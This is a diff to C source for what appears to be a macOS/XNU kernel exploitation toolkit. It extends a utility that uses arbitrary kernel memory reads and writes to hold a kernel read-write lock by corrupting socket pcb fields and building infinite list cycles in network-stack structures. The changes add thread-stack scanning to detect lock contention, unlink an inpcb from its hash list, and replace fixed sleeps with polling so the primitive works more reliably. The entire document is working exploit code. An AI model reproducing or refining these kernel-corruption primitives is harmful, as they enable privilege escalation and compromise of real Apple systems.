@@ -17,8 +17,12 @@
 #include "memory/kmem.h"
 #include "slider/kernel.h"
 #include "xnu/proc.h"
+#include "xnu/thread.h"
 #include "util/dispatch.h"
 #include "util/assert.h"
+#include "util/misc.h"
+#include "util/ptrauth.h"
+#include "util/log.h"
 
 #include "macos_params.h"
 
@@ -36,6 +40,7 @@ struct xe_util_lck_rw {
     uintptr_t nstat_controls_tail;
     uintptr_t necp_uuid_id_mapping_head;
     uintptr_t necp_uuid_id_mapping_tail;
+    uintptr_t locking_thread;
     
     dispatch_semaphore_t sem_disconnect_done;
 };
@@ -157,6 +162,7 @@ void xe_util_lck_read_necp_uuid_id_mapping_state(xe_util_lck_rw_t util) {
     util->necp_uuid_id_mapping_tail = tail;
 }
 
+
 xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     struct sockaddr_in6 src_addr;
     bzero(&src_addr, sizeof(src_addr));
@@ -205,6 +211,7 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     dispatch_semaphore_t sem_disconnect_start = dispatch_semaphore_create(0);
     /// Asynchronously disconnect `util->socket`
     dispatch_async(xe_dispatch_queue(), ^() {
+        util->locking_thread = xe_xnu_thread_current_thread();
         dispatch_semaphore_signal(sem_disconnect_start);
         /// Triggers `in6_pcbdisconnect` method which acquires `util->target_lck_rw`. Since the method
         /// `xe_util_lck_create_nstat_controls_cycle` has created a cycle in `nstat_pcb_cache`, the lock is kept held
@@ -217,13 +224,52 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     dispatch_semaphore_wait(sem_disconnect_start, DISPATCH_TIME_FOREVER);
     dispatch_release(sem_disconnect_start);
     /// Wait for some time so that the lock will be acquired
-    sleep(1);
+    while (xe_kmem_read_ptr(lock, 8) != util->locking_thread) {
+        xe_sleep_ms(10);
+    }
     
     return util;
 }
 
 
-void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
+uintptr_t xe_util_lck_rw_locking_thread(xe_util_lck_rw_t util) {
+    return util->locking_thread;
+}
+
+
+int xe_util_lck_rw_wait_for_contention(xe_util_lck_rw_t util, uintptr_t thread, uint64_t timeout_ms) {
+    uint64_t max_tries = timeout_ms == 0 ? UINT64_MAX : timeout_ms / 10;
+    
+    do {
+        _Bool w_waiting = xe_kmem_read_bitfield_uint64(util->target_lck_rw, TYPE_LCK_RW_BF0_OFFSET, TYPE_LCK_RW_BF0_MEM_W_WAITING_BIT_OFFSET, TYPE_LCK_RW_BF0_MEM_W_WAITING_BIT_SIZE);
+        if (!w_waiting) {
+            xe_log_verbose("no contention by %p (w_waiting)", (void*)thread);
+            continue;
+        }
+        
+        uintptr_t lr_exclusive_gen = xe_slider_kernel_slide(LR_LCK_RW_LOCK_EXCLUSIVE_EXCLUSIVE_GEN);
+        uintptr_t found_address;
+        int error = xe_xnu_thread_scan_stack(thread, lr_exclusive_gen, XE_PTRAUTH_MASK, 512, &found_address);
+        if (error == EBADF || error == ENOENT) {
+            xe_log_verbose("no contention by %p (stack_scan err: %d)", (void*)thread, error);
+            continue;
+        }
+        xe_assert_err(error);
+        
+        uintptr_t lock = xe_kmem_read_ptr(found_address - 0x10 /* x19 */, 0);
+        if (lock == util->target_lck_rw) {
+            return 0;
+        }
+        
+        xe_log_verbose("no contention by %p (lock (%p) does not match)", (void*)thread, (void*)lock);
+    } while (--max_tries > 0 && xe_sleep_ms(10) == 0);
+    
+    return ETIMEDOUT;
+}
+
+
+void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util_p) {
+    xe_util_lck_rw_t util = *util_p;
     /// Restores the value of `socket->so_pcb->inp_pcbinfo` so that operations in `in_pcbrehash` requiring
     /// `inp_pcbinfo` will not cause panic
     /// void
@@ -235,7 +281,7 @@ void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
     ///     head = &inp->inp_pcbinfo->ipi_hashbase[inp->inp_hash_element];
     ///     ...
     /// }
-    xe_util_lck_rw_restore_lock(*util);
+    xe_util_lck_rw_restore_lock(util);
     
     /// Assigns different laddr (other than loopback) to `socket->so_pcb->inp_dependladdr`. This prevents
     /// `necp_socket_bypass` method from returning `NECP_BYPASS_TYPE_LOOPBACK` allowing
@@ -247,7 +293,21 @@ void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
     ///  }
     struct in6_addr new_laddr;
     memset(&new_laddr, 0xab, sizeof(new_laddr));
-    xe_kmem_write((*util)->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET, &new_laddr, sizeof(new_laddr));
+    xe_kmem_write(util->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET, &new_laddr, sizeof(new_laddr));
+    
+    /// Clear INP2_INHASHLIST flag from `so_pcb->inp_flags2`
+    uint32_t flags2 = xe_kmem_read_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET);
+    if (flags2 & 0x00000010) { // INP2_INHASHLIST
+        uintptr_t next = xe_kmem_read_ptr(util->so_pcb, TYPE_INPCB_MEM_INP_HASH_OFFSET);
+        uintptr_t prev = xe_kmem_read_ptr(util->so_pcb, TYPE_INPCB_MEM_INP_HASH_OFFSET + 8);
+        xe_assert(prev != 0);
+        if (next) {
+            xe_kmem_write_uint64(next, TYPE_INPCB_MEM_INP_HASH_OFFSET + 8, prev);
+        }
+        xe_kmem_write_uint64(prev, 0, next);
+        xe_kmem_write_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET, flags2 & ~0x00000010);
+        xe_log_debug("removed inpcb from hash list");
+    }
     
     /// Prevent the `LIST_FOREACH` in `necp_uuid_lookup_uuid_with_service_id_locked` method from breaking
     /// static struct necp_uuid_id_mapping *
@@ -262,7 +322,7 @@ void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
     ///     }
     ///     ...
     /// }
-    xe_util_lck_invalidate_necp_ids(*util);
+    xe_util_lck_invalidate_necp_ids(util);
     
     /// Create a infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked` method. This method is
     /// indirectly triggered during socket disconnect by method `in6_pcbdisconnect`. The call stack is
@@ -271,29 +331,31 @@ void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
     ///     inp_update_necp_policy
     ///     in_pcbrehash
     ///     in6_pcbdisconnect
-    xe_util_lck_create_necp_mapping_cycle(*util);
+    xe_util_lck_create_necp_mapping_cycle(util);
     
     /// Breaks the infinite loop in `nstat_pcb_cache`
-    xe_util_lck_break_nstat_controls_cycle(*util);
+    xe_util_lck_break_nstat_controls_cycle(util);
     
     /// Wait so that program reaches and stays at infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked`
-    sleep(1);
+    while (!(xe_kmem_read_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET) & 0x00000010)) {
+        xe_sleep_ms(10);
+    }
     
     /// Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to util->target_lck_rw so that correct lock
     /// will be unlocked when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
-    xe_util_lck_rw_set_lock(*util);
+    xe_util_lck_rw_set_lock(util);
     
     /// Restore id and break the loop in infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked `
-    xe_util_lck_restore_necp_ids(*util);
-    xe_util_lck_break_necp_mapping_cycle(*util);
+    xe_util_lck_restore_necp_ids(util);
+    xe_util_lck_break_necp_mapping_cycle(util);
     
     /// Wait until socket `disconnectx` returns success
-    dispatch_semaphore_wait((*util)->sem_disconnect_done, DISPATCH_TIME_FOREVER);
+    dispatch_semaphore_wait(util->sem_disconnect_done, DISPATCH_TIME_FOREVER);
     
     /// Restores value of `socket->so_pcb->inp_pcbinfo`
-    xe_util_lck_rw_restore_lock(*util);
+    xe_util_lck_rw_restore_lock(util);
     
-    dispatch_release((*util)->sem_disconnect_done);
-    free(*util);
-    *util = NULL;
+    dispatch_release(util->sem_disconnect_done);
+    free(util);
+    *util_p = NULL;
 }
